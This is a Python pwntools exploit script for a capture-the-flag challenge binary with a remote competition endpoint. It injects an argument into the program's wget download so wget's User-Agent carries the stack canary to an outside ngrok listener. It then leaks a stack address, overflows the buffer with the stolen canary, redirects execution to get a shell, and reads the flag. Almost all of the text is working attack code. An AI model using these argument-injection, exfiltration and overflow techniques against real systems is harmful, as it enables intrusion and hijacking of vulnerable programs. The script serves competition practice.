#!/usr/bin/env python3

from pwn import *
context.log_level = 'info'

elf = ELF("./chall")

context.binary = elf

def menu():
    return p.recvuntil(b'5. Leave\n> ')

def download(url):
    p.sendline(b'2')
    p.sendlineafter(b'Your URL: ', url)
    return menu()

def sla(delim,line): return p.sendlineafter(delim,line)


if args.REMOTE:
  p = remote("ptmLibrary.finals.m0lecon.it", 9274)
else:
  p = process(elf.path)

menu()

arg_inject = b'-U'+p8(0)

p.sendline(b'4')
p.sendlineafter(b'Please provide us your name for future records: ', arg_inject)
menu()
p.sendline(b'1')
sla('> ', b'-')
p.recvuntil('Action ',drop=True)
leak = int(p.recvuntil(' ', drop=True),10)
stack = leak-0x7f
print('stack = '+hex(stack))
sla('> ', '5')

# our ngrok instance for getting back the COOKIE that ill be pass in user-agent
s = server(8080)
payload = b"http://0b38-156-146-63-148.ngrok-free.app"
payload += p8(0)*(170-len(payload))
payload += p64(elf.symbols['name'])
payload += p64(stack)[0:6]
p.sendline(b'2')
p.sendlineafter(b'Your URL: ', payload)
server_conn = s.next_connection()
# get connection back of wget, extract cookie from User-Agent
server_conn.recvuntil('User-Agent: ', drop=True)
canary = u64(p8(0)+server_conn.recv(7))
print('canary = '+hex(canary))
server_conn.close()

ret = 0x000000000040101a # ret
payload = b'\x00'*0xc2+p64(canary)+p64(stack-0x99)+p64(0x4014ff)

sla('> ',b'2')
p.sendlineafter(b'Your URL: ', payload)
# enjoye shell
p.sendline('echo; cat flag*;echo')

p.interactive()

